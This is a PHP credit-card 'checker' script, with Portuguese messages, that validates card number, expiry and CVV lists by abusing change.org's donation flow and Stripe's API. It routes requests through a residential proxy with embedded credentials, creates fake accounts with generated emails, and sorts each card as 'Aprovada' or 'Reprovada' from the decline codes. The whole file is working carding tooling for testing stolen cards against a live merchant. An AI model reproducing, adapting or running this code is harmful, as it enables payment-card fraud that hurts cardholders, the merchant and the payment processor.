<?php
session_start();
error_reporting(0);

function getStr($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$delemitador = array("|", ":", "/");
$lista = $_GET['lista'];
$cc = multiexplode($delemitador, $lista)[0];
$mes = multiexplode($delemitador, $lista)[1];
$ano = multiexplode($delemitador, $lista)[2];
$cvv = multiexplode($delemitador, $lista)[3];

if (strlen($mes) == 1){
    $mes = "0$mes";
}

if (strlen($ano) == 2){
    $ano = "$ano";
}elseif(strlen($ano) == 4){
    $ano = substr($ano,2,2);
}

if ($cc == NULL || $mes == NULL || $ano == NULL || $cvv == NULL) {
    die('{"status":"die","lista":"null","message":"Cartao invalido, teste nao iniciado.","valor":"R$30,00"}');
}
$rand = rand(10,15);
$emailgen = uniqid()."@gmail.com";
$proxy = 'http://twister23-zone-resi-region-br:2905le@pr.pyproxy.com:16666';
sleep($rand);

// GET TOKENS
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.change.org/p/pioneer-dj-s-rekordbox-for-linux/");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(''));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$add = curl_exec($ch);
    $_change_session = getStr($add, '_change_session=',';',1);
    $csrf = getStr($add, 'csrfToken":"','"',1);

    //print_r("Retorno: $add | Change Sess: $_change_session | CSRF: $csrf<br><br>");

// STRIPE CC -> KEY
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_methods");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: api.stripe.com',
    'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
    'Accept: application/json',
    'Accept-Language: en-US,en;q=0.5',
    'Accept-Encoding: gzip, deflate, br',
    'Referer: https://js.stripe.com/',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://js.stripe.com',
    'Connection: keep-alive',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-site'
    )
);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Renato+Aragao&billing_details[email]='.urlencode($emailgen).'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F0c40733660%3B+stripe-js-v3%2F0c40733660&time_on_page=123943&key=pk_live_Xt6NLu4uUqbhU7arqU6xEdJT');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$add = curl_exec($ch);
#print_r($add);exit;
//print_r($add);exit;
    if(strpos($add, 'incorrect') !== false){
        print_r("<b><span class='badge badge-danger'>Reprovada</span><Br> - $cc|$mes|$ano|$cvv - Cartao invalido"); exit;
    }else{
        $pm_stripe = getStr($add, 'id": "','"', 1);
    }

    //print_r("Retorno: $add | PM Stripe: $pm_stripe<br><br>");


// GRAPH QL - CREATE USER
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.change.org/api-proxy/graphql/createUser");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.change.org',
    'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
    'Accept: application/json',
    'Accept-Language: en-US,en;q=0.5',
    'Accept-Encoding: gzip, deflate, br',
    'Referer: https://www.change.org/p/pioneer-dj-s-rekordbox-for-linux/sponsors/new?source_location=combo_psf&psf_variant=combo&cbd_s=eyJleHBlcmltZW50TmFtZSI6InBzZl9jb21iby0zMzgwMDU3MiIsInZhcmlhbnQiOnsidmFyaWFudE5hbWUiOiJhMyIsImRhdGEiOnsiYW1vdW50Ijo1MjUsImFtb3VudF9pZCI6ImEzIn0sInB1bGxzIjozMCwicmV3YXJkcyI6Mjh9LCJ2YXJpYW50TmFtZSI6ImEzIiwiY29tYm9CYW5kaXRBbW91bnQiOjM1LCJhbW91bnRJZCI6ImEzIn0%3D',
    'content-type: application/json',
    'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjgzOSIsImFwIjoiNTU2OTg0MzgwIiwiaWQiOiJjOTc5YzY1Y2ViZDkxZWJhIiwidHIiOiI2NDRjNzEzOTNjODhkZTFkZjE0NTM1MDc4YjBkMGYzNSIsInRpIjoxNjg2OTM3NDg1ODc0fX0=',
    'traceparent: 00-644c71393c88de1df14535078b0d0f35-c979c65cebd91eba-01',
    'tracestate: 839@nr=0-1-839-556984380-c979c65cebd91eba----1686937485874',
    'x-csrf-token: '.$csrf,
    'x-requested-with: http-link',
    'Origin: https://www.change.org',
    'Connection: keep-alive',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers'
    )
);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"PaymentCreateUser","variables":{"input":{"countryCode":"BR","email":"'.$emailgen.'","firstName":"Renato","lastName":"Aragao","signupContext":"payment_promotion","signupMethod":"PAYMENT"}},"query":"mutation PaymentCreateUser($input: CreateUserInput!) {\n  createUser(input: $input) {\n    ... on UserAlreadyExistsError {\n      userId\n      userPasswordSet\n      __typename\n    }\n    ... on CreateUserSuccess {\n      user {\n        id\n        displayName\n        shortDisplayName\n        country {\n          countryCode\n          __typename\n        }\n        stateCode\n        city\n        formattedLocationString\n        firstName\n        lastName\n        uuid\n        email\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}"}');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$add = curl_exec($ch);
    $uuid = getStr($add, 'uuid":"','"', 1);
#print_r($uuid);exit;
    //print_r("UUID: $uuid | Retorno: <br><br>$add <br><br>");

// GRAPH QL - SETUP PAYMENT METHOD
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.change.org/api-proxy/graphql/payments/setupPaymentMethod");
curl_setopt($ch, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.change.org',
    'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
    'Accept: application/json',
    'Accept-Language: en-US,en;q=0.5',
    'Accept-Encoding: gzip, deflate, br',
    'Referer: https://www.change.org/p/pioneer-dj-s-rekordbox-for-linux/sponsors/new?source_location=combo_psf&psf_variant=combo&cbd_s=eyJleHBlcmltZW50TmFtZSI6InBzZl9jb21iby0zMzgwMDU3MiIsInZhcmlhbnQiOnsidmFyaWFudE5hbWUiOiJhMyIsImRhdGEiOnsiYW1vdW50Ijo1MjUsImFtb3VudF9pZCI6ImEzIn0sInB1bGxzIjozMCwicmV3YXJkcyI6Mjh9LCJ2YXJpYW50TmFtZSI6ImEzIiwiY29tYm9CYW5kaXRBbW91bnQiOjM1LCJhbW91bnRJZCI6ImEzIn0%3D',
    'content-type: application/json',
    'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjgzOSIsImFwIjoiNTU2OTg0MzgwIiwiaWQiOiI5ZjU0ZmI1OTRiNzVmN2RiIiwidHIiOiJjYzA0YTc3ODRhNjhmODUyMjIyODk0ZmU2Nzg4NGI4ZSIsInRpIjoxNjg2OTM3NDg2NTY0fX0=',
    'traceparent: 00-cc04a7784a68f852222894fe67884b8e-9f54fb594b75f7db-01',
    'tracestate: 839@nr=0-1-839-556984380-9f54fb594b75f7db----1686937486564',
    'x-csrf-token: '.$csrf,
    'x-requested-with: http-link',
    'Origin: https://www.change.org',
    'Connection: keep-alive',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"variables":{"input":{"gateway":"STRIPE","usage":"ON_SESSION","token":"'.$pm_stripe.'","customer":{"currencyCode":"BRL","countryCode":"BR"},"type":"CREDIT_CARD"}},"query":"mutation ($input: SetupPaymentMethodInput!) {\n  setupPaymentMethod(input: $input) {\n    ... on SetupPaymentMethodError {\n      message\n      type\n      __typename\n    }\n    ... on SetupPaymentMethodSuccess {\n      gatewayData {\n        ... on SetupPaymentMethodStripeGatewayData {\n          setupIntent {\n            clientSecret\n            accountId\n            paymentMethodId\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}"}');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$add = curl_exec($ch);
    $seti = getStr($add, 'clientSecret":"','"', 1);
    $setiurl = getStr($add, 'clientSecret":"seti_','_', 1);
    $accountid = getStr($add, 'accountId":"','"', 1);

    //print_r("Seti: $seti | SetiURL: $setiurl | AccountID: $accountid <br>Retorno:<br><br>$add<br><hr>");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/setup_intents/seti_$setiurl/confirm");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Host: api.stripe.com',
    'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
    'Accept: application/json',
    'Accept-Language: en-US,en;q=0.5',
    'Accept-Encoding: gzip, deflate, br',
    'Referer: https://js.stripe.com/',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://js.stripe.com',
    'Connection: keep-alive',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-site',
    'TE: trailers'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'expected_payment_method_type=card&key=pk_live_Xt6NLu4uUqbhU7arqU6xEdJT&_stripe_account='.$accountid.'&client_secret='.$seti);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$add = curl_exec($ch);

//print_r($add);//exit;

    if(strpos($add, 'declined') !== false){
        print_r("<b><span class='badge badge-danger'>Reprovada</span><Br> $cc|$mes|$ano|$cvv - Declined");
    }elseif(strpos($add, 'incorrect_cvc') !== false){
        print_r("<b><span class='badge badge-success'>Aprovada</span><br> $cc|$mes|$ano|$cvv - CVV Incorreto");
    }elseif(strpos($add, 'does not have access to account') !== false){
        print_r("<b><span class='badge badge-danger'>Reprovada</span><Br>  $cc|$mes|$ano|$cvv - API SEM PROXY");
    }else{


        print_r("<b><span class='badge badge-danger'>Reprovada</span><Br> $cc|$mes|$ano|$cvv - Erro na transação");
    }

?>
